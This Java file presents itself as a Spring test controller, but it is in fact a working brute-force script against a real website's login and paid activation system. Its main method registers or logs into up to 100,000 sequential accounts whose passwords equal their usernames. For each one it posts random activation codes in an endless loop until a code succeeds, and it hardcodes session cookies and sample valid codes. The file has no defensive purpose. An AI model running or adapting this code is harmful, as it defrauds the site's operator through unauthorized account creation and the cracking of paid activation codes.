package com.ltzz.modules.base.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import io.swagger.annotations.Api;
import lombok.AllArgsConstructor;
import okhttp3.*;
import org.apache.commons.lang.StringUtils;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.util.*;

/**
 * @author luox
 * @description 股票数据处理
 * @date 2019/10/25
 */
@RestController
@RequestMapping("/test")
@Api(value = "各种接口测试", tags = "各种接口测试")
@AllArgsConstructor
public class TestController {
    private static Log log = LogFactory.getLog(TestController.class);

    /**
     * java生成随机数字和字母组合
     *
     * @param length [生成随机数的长度]
     * @return
     */
    public static String getCharAndNumr(int length) {
        String val = "";
        Random random = new Random();
        for (int i = 0; i < length; i++) {
            // 输出字母还是数字
            String charOrNum = random.nextInt(2) % 2 == 0 ? "char" : "num";
            if ("char".equalsIgnoreCase(charOrNum)) {
                // 字符串 此处只需要小写字母
                val += (char) (97 + random.nextInt(26));
            } else if ("num".equalsIgnoreCase(charOrNum)) {
                // 数字
                val += String.valueOf(random.nextInt(10));
            }
        }
        return val;
    }

    /**
     * 登录或者注册
     * @author luox
     * @date 2021/8/10
     * @param userName
     * @return
     */
    public static Map<String, String> registAndLogin(String userName, String pwd) throws IOException {
        Map<String, String> res = new HashMap<String, String>();
        OkHttpClient client = new OkHttpClient().newBuilder().build();
        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");
        StringBuilder sb = new StringBuilder();
        sb.append("name=").append(userName).append("&password=").append(pwd);
        RequestBody body = RequestBody.create(mediaType, sb.toString());
        Request request = new Request.Builder()
                .url("http://www.gongyingjituan.com/user/login")
                .method("POST", body)
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0")
                .addHeader("Accept", "application/json, text/javascript, */*; q=0.01")
                .addHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
                .addHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
                .addHeader("X-Requested-With", "XMLHttpRequest")
                .addHeader("Origin", "http://www.gongyingjituan.com")
                .addHeader("Connection", "keep-alive")
                .addHeader("Referer", "http://www.gongyingjituan.com/user/login?back_url=%2Fuser")
                .addHeader("Cookie", "channel_identity=wqsy; UM_distinctid=17ae64fcba72c2-00b60102c79d7b8-1b317140-1fa400-17ae64fcba84a8; CNZZDATA1277808253=1274310326-1627360314-%7C1628497890; CNZZDATA1277699987=897866052-1627356690-%7C1628500988; user_auto_regist=0; PHPSESSID=kv77mqsesql06vm58dfr05sv95; channel_identity=wqsy")
                .build();
        Response response = client.newCall(request).execute();
        JSONObject obj = JSONObject.parseObject(response.body().string());
        if (200 == response.code() && response.message().equals("OK") && StringUtils.isBlank(obj.getString("body")) && obj.getString("msg").equals("0")) {
            List<String> values = response.headers().values("Set-Cookie");
            for (String value : values) {
                String[] sp = value.split(";")[0].split("=");
                if (sp[0].equals("user_token")) {
                    res.put("user_token", sp[1]);
                    continue;
                }
                if (sp[0].equals("user_account")) {
                    res.put("user_account", sp[1]);
                    continue;
                }
                if (sp[0].equals("user_name")) {
                    res.put("user_name", sp[1]);
                    continue;
                }
                if (sp[0].equals("user_nickname")) {
                    res.put("user_nickname", sp[1]);
                    continue;
                }
                if (sp[0].equals("user_login_time")) {
                    res.put("user_login_time", sp[1]);
                    continue;
                }
            }
        }
        return res;
    }

    /**
     * 激活
     * @author luox
     * @date 2021/8/10
     * @param params          活跃参数
     * @param activeCode      激活码
     * @return
     */
    public static boolean active(Map<String, String> params, String activeCode) throws IOException {
        if (params.isEmpty()) {
            log.info("active params is empty");
            return false;
        }
        OkHttpClient client = new OkHttpClient().newBuilder().build();
        MediaType mediaType = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");
        StringBuilder cookie = new StringBuilder();
        cookie.append("channel_identity=wqsy; UM_distinctid=17ae64fcba72c2-00b60102c79d7b8-1b317140-1fa400-17ae64fcba84a8; CNZZDATA1277808253=1274310326-1627360314-%7C1628497890; CNZZDATA1277699987=897866052-1627356690-%7C1628495581; user_auto_regist=0; PHPSESSID=kv77mqsesql06vm58dfr05sv95");
        cookie.append("; user_token=").append(params.get("user_token"));
        cookie.append("; user_account=").append(params.get("user_account"));
        cookie.append("; user_name=").append(params.get("user_name"));
        cookie.append("; user_nickname=").append(params.get("user_nickname"));
        cookie.append("; user_login_time=").append(params.get("user_login_time"));
        cookie.append("; channel_identity=wqsy");
        RequestBody body = RequestBody.create(mediaType, "kalman=" + activeCode);
        Request request = new Request.Builder()
                .url("http://www.gongyingjituan.com/gmht.php?act=pay_all")
                .method("POST", body)
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0")
                .addHeader("Accept", "application/json, text/javascript, */*; q=0.01")
                .addHeader("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
                .addHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
                .addHeader("X-Requested-With", "XMLHttpRequest")
                .addHeader("Origin", "http://www.gongyingjituan.com")
                .addHeader("Connection", "keep-alive")
                .addHeader("Referer", "http://www.gongyingjituan.com/user")
                .addHeader("Cookie", cookie.toString())
                .build();
        Response response = client.newCall(request).execute();
        JSONObject obj = JSONObject.parseObject(response.body().string());
        if (200 == response.code() && response.message().equals("OK") && obj.getString("msg").equals("0")) {
            return true;
        }
        log.info(obj.toString());
        return false;
    }

    /**
     * 爆力破解
     * @author luox
     * @date 2021/8/10
     * @param startAccount   超始账号
     * @param leaf           破解账号次数
     * @return
     */
    public static Map<String, String> baoPo(Long startAccount, int leaf) throws Exception {
        List<String> usedCode = new ArrayList<String>();
        Map<String, String> successAccount = new HashMap<String, String>();
        for (int i = 0; i < leaf; i++) {
            String userName = "qq".concat(String.valueOf(startAccount));
            String pwd = userName;
            log.info("current loop userName is : " + userName);
            //  登录或者注册
            Map<String, String> loginInfo = registAndLogin(userName, pwd);
            if (null != loginInfo && !loginInfo.isEmpty()) {
                //  激活  wqsyba344f0583d3  yxdzd1cd4f570097  yxdz4b334e34a758
                while (true) {
                    String code = getCharAndNumr(10);
                    System.out.println("生成的10为随机数为：" + code);
                    if (usedCode.contains(code)) {
                        log.info("当前code已使用过");
                        continue;
                    }
                    boolean activeFlag = active(loginInfo, code);
                    usedCode.add(code);
                    if (activeFlag) {
                        log.info("active success，username = " + userName + ", pwd = " + pwd);
                        successAccount.put(userName, pwd);
                        break;
                    } else {
                        log.info("激活码不正确，休息5s后再试");
                        Thread.sleep(5000);
                    }
                }
            }
        }
        return successAccount;
    }

    public static void main(String[] args) {
        try {
            Map<String, String> baoPoRes = baoPo(3838438L, 100000);
            log.info(JSON.toJSONString(baoPoRes));
        } catch (Exception e) {
            log.error("", e);
        }
    }
}
